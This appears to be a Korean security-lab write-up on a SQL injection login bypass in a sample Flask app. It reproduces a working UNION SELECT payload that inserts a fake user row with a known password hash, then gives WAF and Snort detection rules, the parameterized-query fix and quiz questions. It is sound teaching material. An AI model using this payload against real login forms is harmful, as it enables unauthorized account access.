# 01 · SQL Injection (로그인 우회)

## 1. 한 줄 요약
로그인할 때 입력한 아이디를 쿼리 문자열에 그대로 끼워 넣어서, 공격자가 **쿼리 자체를 바꿔** 원하는 결과 행을 만들어 로그인을 통과할 수 있다.

> **SQL Injection**: 사용자 입력이 SQL 쿼리 문자열에 그대로 섞여 들어가, 입력값이 데이터가 아니라 **쿼리 명령의 일부**로 실행되는 취약점.

## 2. 원리: 왜 취약한가

로그인 처리 코드 (`auth.py:41`):

```python
# auth.py:41
user = db.query("SELECT * FROM users WHERE username='%s'" % request.form["username"], one=True)
# auth.py:42
if user and check_password_hash(user["pw"], request.form["password"]):
```

문제는 `% request.form["username"]` 입니다. 사용자가 보낸 `username`을 **파이썬 문자열 포맷(`%`)으로 쿼리에 직접 붙입니다.** 따옴표 같은 특수문자를 거르지 않으므로, 입력에 따옴표를 넣으면 쿼리 구조가 바뀝니다.

예를 들어 아이디로 `alice`를 넣으면 쿼리는 이렇게 됩니다.

```sql
SELECT * FROM users WHERE username='alice'
```

그런데 아이디에 따옴표를 섞으면 `WHERE` 조건을 닫아 버리고 뒤에 원하는 SQL을 이어 붙일 수 있습니다.

### 왜 `' OR 1=1 -- ` 만으로는 안 되나

흔한 공격인 `' OR 1=1 -- `(참이 되는 조건)를 넣으면 쿼리는 모든 행을 반환하고 그중 첫 번째 사용자 행이 돌아옵니다. 하지만 `auth.py:42`의 **비밀번호 해시 검증은 그대로 살아 있습니다.**

```python
if user and check_password_hash(user["pw"], request.form["password"]):
```

`check_password_hash(저장된_해시, 입력한_비밀번호)`는 둘이 맞아야 `True`입니다. `OR 1=1`로 가져온 첫 사용자의 **진짜 해시**는 우리가 모르므로, 아무 비밀번호나 넣어도 검증에서 막혀 우회에 **실패**합니다.

> **비밀번호 해시**: 비밀번호를 그대로 저장하지 않고 되돌릴 수 없는 형태로 변환해 저장한 값. 로그인 때 입력값을 같은 방식으로 변환해 비교한다. 여기서는 werkzeug의 `generate_password_hash` / `check_password_hash`를 쓴다(`auth.py:4`, 회원가입은 `auth.py:29`).

### UNION SELECT로 해시 검증까지 통과시키기

그래서 핵심 기법은 **`UNION SELECT`로 가짜 사용자 행을 결과에 끼워 넣는 것**입니다. 공격자가 평문을 아는 해시를 직접 넣으면, `auth.py:42`의 해시 검증도 통과합니다.

`users` 테이블은 컬럼이 **`id`, `username`, `pw` 3개**입니다(`schema.sql:2`~`4`). `SELECT *`는 이 3개를 반환하므로, `UNION`으로 붙이는 `SELECT`도 컬럼이 **정확히 3개**여야 합니다.

> **UNION SELECT**: 두 개의 SELECT 결과를 위아래로 합치는 SQL. 합치려면 양쪽의 컬럼 개수와 순서가 맞아야 한다. 공격자는 이걸로 원하는 값이 든 가짜 행을 결과에 더한다.

## 3. 실습: 공격 재현

### 준비 — 평문을 아는 해시 하나 만들기

werkzeug로 아무 비밀번호의 해시를 하나 생성합니다. (예: 비밀번호 `pass123`)

```bash
python -c "from werkzeug.security import generate_password_hash; print(generate_password_hash('pass123'))"
# 출력 예: scrypt:32768:8:1$....(긴 문자열)....
```

이 출력 문자열을 `<werkzeug해시>`라고 부르겠습니다. **평문은 `pass123`, 해시는 위 출력**입니다.

### 공격 요청

로그인 화면에서 `POST /login`으로 아래 값을 보냅니다.

- **username** (끝에 **공백 필수**):
  ```
  ' UNION SELECT 999,'hacker','<werkzeug해시>' -- 
  ```
- **password**: `pass123`  (위 해시의 평문)

### 실제로 실행되는 쿼리

`auth.py:41`의 문자열 포맷 결과는 이렇게 됩니다.

```sql
SELECT * FROM users WHERE username='' UNION SELECT 999,'hacker','<werkzeug해시>' -- '
```

- 앞의 `username=''`는 아무 사용자와도 안 맞아 결과가 비어 있습니다.
- `UNION SELECT 999,'hacker','<werkzeug해시>'`가 **가짜 행 1개**를 결과에 더합니다. 순서는 `id=999`, `username='hacker'`, `pw='<werkzeug해시>'`로 테이블 컬럼 순서(`id,username,pw`)와 맞췄습니다.
- `-- `(뒤에 공백)는 MySQL **주석**이라 그 뒤에 남은 `'`를 무효로 만들어 문법 오류를 막습니다. 그래서 끝의 공백이 필요합니다.

결과로 `user = {"id":999, "username":"hacker", "pw":"<werkzeug해시>"}`가 돌아옵니다.

### 기대 결과

`auth.py:42`에서 `check_password_hash('<werkzeug해시>', 'pass123')`이 `True`가 되어 로그인에 **성공**합니다. 세션에 `uid=999`, `name='hacker'`로 로그인된 상태가 됩니다. 실제로 DB에 없는 사용자로 들어간 것입니다.

## 4. 탐지: WAF·Snort에서 보이는 요청 특징

이 공격은 `POST /login` 요청 **본문의 `username` 파라미터**에 SQL 조각이 들어옵니다. 특징적인 신호:

- `UNION SELECT` (대소문자 섞일 수 있음)
- 작은따옴표 `'`
- SQL 주석 `-- ` (뒤 공백) 또는 `--`, `#`, `/* */`
- 항상 참 조건 `OR 1=1`

### 탐지 규칙 예시

**WAF (정규식 — URL 디코딩된 요청 본문에 적용):**

```
(?i)(union\s+select|'\s*or\s+1\s*=\s*1|--\s|/\*)
```
(`(?i)` = 대소문자 무시. `\s+` = 공백 1개 이상.)

**Snort (HTTP 요청 본문에서 content 매치):**

```
alert tcp any any -> $WEB_SERVER 443 ( \
  msg:"SQLi UNION SELECT in login"; flow:to_server,established; \
  content:"POST"; http_method; content:"/login"; http_uri; \
  content:"UNION"; nocase; http_client_body; \
  content:"SELECT"; nocase; http_client_body; distance:0; \
  sid:1000001; rev:1; )
```

```
alert tcp any any -> $WEB_SERVER 443 ( \
  msg:"SQLi OR 1=1 in login"; flow:to_server,established; \
  content:"/login"; http_uri; \
  content:"OR 1=1"; nocase; http_client_body; \
  sid:1000002; rev:1; )
```

> 참고: 사용자 → Web 구간은 HTTPS(443)로 암호화됩니다. 암호문 그대로는 content 매치가 안 되므로, 실제로는 **Nginx가 복호화한 뒤**(평문 HTTP가 되는 gunicorn 앞단)에서 검사하거나, WAF를 Nginx 앞/안에 두고 복호화된 요청을 보게 해야 합니다. Snort만으로 TLS 안을 보려면 별도 복호화가 필요합니다.

## 5. 대응: 안전한 코드로 고치기

근본 원인은 "입력을 쿼리 문자열에 직접 붙인 것"입니다. **파라미터 바인딩**(값을 쿼리 구조와 분리해 전달)으로 고칩니다. DB 드라이버가 값을 데이터로만 다루므로 따옴표를 넣어도 쿼리 구조가 바뀌지 않습니다.

**Before (`auth.py:41`):**
```python
user = db.query("SELECT * FROM users WHERE username='%s'" % request.form["username"], one=True)
```

**After:**
```python
user = db.query("SELECT * FROM users WHERE username=%s", (request.form["username"],), one=True)
```

- 따옴표를 쿼리에서 빼고(`username=%s`), 값은 **두 번째 인자 튜플**로 넘깁니다. `db.query`는 `cur.execute(sql, args)`로 이 값을 안전하게 바인딩합니다(`db.py:34`~`37`).
- 이러면 `' UNION SELECT ...`를 입력해도 "그런 이름의 사용자"를 찾을 뿐 쿼리 구조는 그대로입니다.
- 참고: 회원가입(`auth.py:29`)과 글쓰기(`posts.py:24`)는 **이미** `%s` + 튜플 바인딩을 올바르게 쓰고 있습니다. 로그인만 문자열 포맷을 쓴 것이 문제입니다.

## 6. 확인 문제

<details>
<summary>Q1. `' OR 1=1 -- ` 만으로는 로그인 우회에 실패한다. 왜인가?</summary>

`auth.py:42`의 `check_password_hash` 비밀번호 해시 검증이 살아 있기 때문. `OR 1=1`은 첫 사용자 행을 돌려주지만 그 사용자의 진짜 해시를 모르므로 비밀번호 검증에서 막힌다. 그래서 공격자가 **평문을 아는 해시**를 결과에 끼워 넣는 `UNION SELECT`가 필요하다.
</details>

<details>
<summary>Q2. UNION으로 붙이는 SELECT의 컬럼이 왜 3개여야 하나?</summary>

원래 쿼리가 `SELECT * FROM users`이고 `users` 테이블 컬럼이 `id, username, pw` 3개(`schema.sql:2`~`4`)이기 때문. UNION은 양쪽 컬럼 개수와 순서가 맞아야 합쳐진다. 그래서 `999, 'hacker', '<해시>'` 순서로 3개를 맞춘다.
</details>

<details>
<summary>Q3. 파라미터 바인딩(`username=%s`, 튜플 전달)으로 고치면 왜 안전한가?</summary>

값이 쿼리 구조와 분리되어 DB 드라이버가 "데이터"로만 처리하기 때문. 따옴표나 `UNION SELECT`를 입력해도 명령으로 해석되지 않고, "그런 이름의 사용자명"을 찾을 뿐이라 쿼리 구조가 바뀌지 않는다.
</details>
